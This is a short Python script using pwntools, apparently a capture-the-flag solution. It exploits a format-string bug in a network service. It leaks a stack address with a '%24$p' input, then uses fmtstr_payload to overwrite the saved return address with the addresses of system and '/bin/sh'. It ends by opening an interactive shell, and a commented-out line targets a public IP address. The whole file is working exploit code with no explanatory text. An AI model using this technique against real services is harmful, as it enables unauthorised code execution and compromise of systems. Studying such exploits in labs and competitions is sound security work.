from pwn import *

#addr_system = 0x8050790
addr_system = 0x8050bb8
addr_binsh = 0x80ae88c
sock = remote("127.0.0.1", 4001)
#sock = remote("13.233.66.116", 6969)
_ = raw_input()

sock.recvline()
payload = "%24$p"
sock.sendline(payload)
sock.recvline()
sock.recvline()
addr_buf = int(sock.recvline(), 16)
addr_retaddr = addr_buf + 64 - 0x100
print("&retaddr = " + hex(addr_retaddr))

writes = {
    addr_retaddr: addr_system,
    addr_retaddr+4: addr_binsh
}
payload = fmtstr_payload(
    1, writes, write_size = 'short'
)
print(hex(len(payload)))
sock.recvline()
sock.sendline(payload)
sock.recvline()
sock.recvline()
sock.recvline()
sock.interactive()
